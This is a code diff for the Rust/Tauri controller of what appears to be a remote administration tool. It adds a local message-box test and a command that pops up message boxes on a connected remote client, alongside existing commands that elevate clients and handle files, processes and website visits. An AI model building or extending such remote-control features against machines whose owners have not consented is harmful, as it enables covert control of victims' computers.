@@ -1,12 +1,14 @@
 use tauri::State;
 use crate::handlers::{ SharedServer, SharedTauriState, FrontClient, TauriState };
-use common::commands::{ Command, File as FileData, Process, VisitWebsiteData };
+use common::commands::{ Command, File as FileData, Process, VisitWebsiteData, MessageBoxData };
 
 use serde::Serialize;
 use object::{ Object, ObjectSection };
 use std::fs::{ self, File };
 use std::io::Write;
 use std::vec;
+use std::ptr::null_mut as NULL;
+use winapi::um::winuser;
 
 use rmp_serde::Serializer;
 
@@ -389,4 +391,62 @@ pub fn elevate_client(id: &str, server_state: State<'_, SharedServer>) {
     let client = clients.get_mut(client_id).unwrap();
 
     client.write_buffer(Command::ElevateClient, &Some(client.get_secret()));
+}
+
+#[tauri::command]
+pub fn test_messagebox(title: &str, message: &str, button: &str, icon: &str) {
+    let l_msg: Vec<u16> = format!("{}\0", message).encode_utf16().collect();
+    let l_title: Vec<u16> = format!("{}\0", title).encode_utf16().collect();
+
+    unsafe {
+        winuser::MessageBoxW(
+            NULL(),
+            l_msg.as_ptr(),
+            l_title.as_ptr(),
+            (match button {
+                "ok" => winuser::MB_OK,
+                "ok_cancel" => winuser::MB_OKCANCEL,
+                "abort_retry_ignore" => winuser::MB_ABORTRETRYIGNORE,
+                "yes_no_cancel" => winuser::MB_YESNOCANCEL,
+                "yes_no" => winuser::MB_YESNO,
+                "retry_cancel" => winuser::MB_RETRYCANCEL,
+                _ => winuser::MB_OK,
+            }) |
+                (match icon {
+                    "info" => winuser::MB_ICONINFORMATION,
+                    "warning" => winuser::MB_ICONWARNING,
+                    "error" => winuser::MB_ICONERROR,
+                    "question" => winuser::MB_ICONQUESTION,
+                    "asterisk" => winuser::MB_ICONASTERISK,
+                    _ => winuser::MB_ICONINFORMATION,
+                })
+        );
+    }
+}
+
+#[tauri::command]
+pub fn send_messagebox(
+    id: &str,
+    title: &str,
+    message: &str,
+    button: &str,
+    icon: &str,
+    server_state: State<'_, SharedServer>
+) {
+    let server = server_state.0.lock().unwrap();
+
+    let client_id = id.parse::<usize>().unwrap();
+
+    let mut clients = server.clients.lock().unwrap();
+    let client = clients.get_mut(client_id).unwrap();
+
+    client.write_buffer(
+        Command::ShowMessageBox(MessageBoxData {
+            title: title.to_string(),
+            message: message.to_string(),
+            button: button.to_string(),
+            icon: icon.to_string(),
+        }),
+        &Some(client.get_secret())
+    );
 }
